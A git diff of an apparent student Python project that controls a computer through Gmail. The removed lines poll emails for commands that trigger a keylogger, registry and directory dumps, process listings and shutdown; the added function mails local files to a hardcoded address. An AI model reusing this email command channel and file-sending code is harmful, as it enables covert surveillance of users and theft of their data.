@@ -9,16 +9,10 @@ from googleapiclient.discovery import build
 from googleapiclient.errors import HttpError
 import base64
 import email
-import time
 from bs4 import BeautifulSoup
-import uuid
 from email.mime.text import MIMEText
 from requests import HTTPError
-import k as kls
-import app_process_server_gmail as ap
-import shutdown_logout_server_gmail as sl
-import directory_tree_server_gmail as dt
-import registry_server_gmail as rs
+from email.message import EmailMessage
 
 # If modifying these scopes, delete the file token.json.
 SCOPES = [
@@ -26,6 +20,41 @@ SCOPES = [
     "https://www.googleapis.com/auth/gmail.modify",
     'https://www.googleapis.com/auth/gmail.readonly',
 ]
+def send_message(cmd:str, messageBody:str, attachments: list=None):
+    """Create and send an email message
+    Print the returned  message id
+    Returns: Message object, including message id    """
+
+
+    creds = Credentials.from_authorized_user_file('token.json', SCOPES)
+    try:
+        service = build('gmail', 'v1', credentials=creds)
+        message = EmailMessage()
+
+        message.set_content(cmd+":"+messageBody)
+
+        # I added this part
+        if attachments:
+            for attachment in attachments:
+                with open(attachment, 'rb') as content_file:
+                    content = content_file.read()
+                    message.add_attachment(content, maintype='application', subtype= (attachment.split('.')[1]), filename=attachment)
+
+        message['to'] = 'testpython18mmt@gmail.com'
+        message['subject'] = 'server'
+        # encoded message
+        encoded_message = base64.urlsafe_b64encode(message.as_bytes()).decode()
+
+        create_message = {
+            'raw': encoded_message
+        }
+        # pylint: disable=E1101
+        send_message = (service.users().messages().send
+                        (userId="me", body=create_message).execute())
+        print(F'Message Id: {send_message["id"]}')
+    except HttpError as error:
+        print(F'An error occurred: {error}')
+        send_message = None
 
 def send_mail(cmd, package):
     if os.path.exists('token.json'):
@@ -137,73 +166,3 @@ def mark_as_read(service, m):
     service.users().messages().modify(userId='me', id=m['id'], body={'removeLabelIds': ['UNREAD']}).execute()
     return
 
-
-def mac_address():
-    send_mail("MAC", hex(uuid.getnode()))
-    return
-def key_logger():
-    kls.keylogger()
-    return
-def app_process():
-    ap.app_process()
-    return
-def shutdown_logout():
-    sl.shutdown_logout()
-    return
-def directory_tree():
-    dt.directory()
-    return
-def registry():
-    rs.registry()
-    return
-
-def Connect():
-    while True:
-        cmd = read_mail()
-        if "QUIT" in cmd:
-            return
-        if "MAC" in cmd:
-            mac_address()
-        elif "KEYLOG" in cmd:
-            key_logger()
-        elif "DIRECTORY" in cmd:
-            directory_tree()
-        # elif "LIVESCREEN" in cmd:
-        #     live_screen()
-        elif "APP_PRO" in cmd:
-            app_process()       
-        elif "REGISTRY" in cmd:
-            registry()
-        elif "SD_LO" in cmd:
-            shutdown_logout() 
-
-
-# def create_window():
-#     # create Tk
-#     root = tk.Tk()
-#     # set window size
-#     root.geometry("200x200")
-#     # set name
-#     root.title("Server")
-#     # set background color #B4E4FF
-#     root['bg'] = '#B4E4FF'
-
-#     # create button OPEN
-#     tk.Button(root, text = "OPEN", width = 10, height = 2, fg = '#FFFFFF', bg = '#2B3467', 
-#         borderwidth=0, highlightthickness=0, command = Connect, relief="flat").place(x = 100, y = 100, anchor = "center")
-    
-#     # Vòng lặp chạy chương trình
-#     root.mainloop()
-
-
-# create_window()
-if __name__ == '__main__':
-    Connect()
-    # read_mail()
-    # while True:
-    #     read_mail()
-    #     time.sleep(10)
-
-# https://skillshats.com/blogs/send-and-read-emails-with-gmail-api/ link có hết
-#https://www.youtube.com/watch?v=HNtPG5ltFf8
-#https://developers.google.com/gmail/api/guides/labels
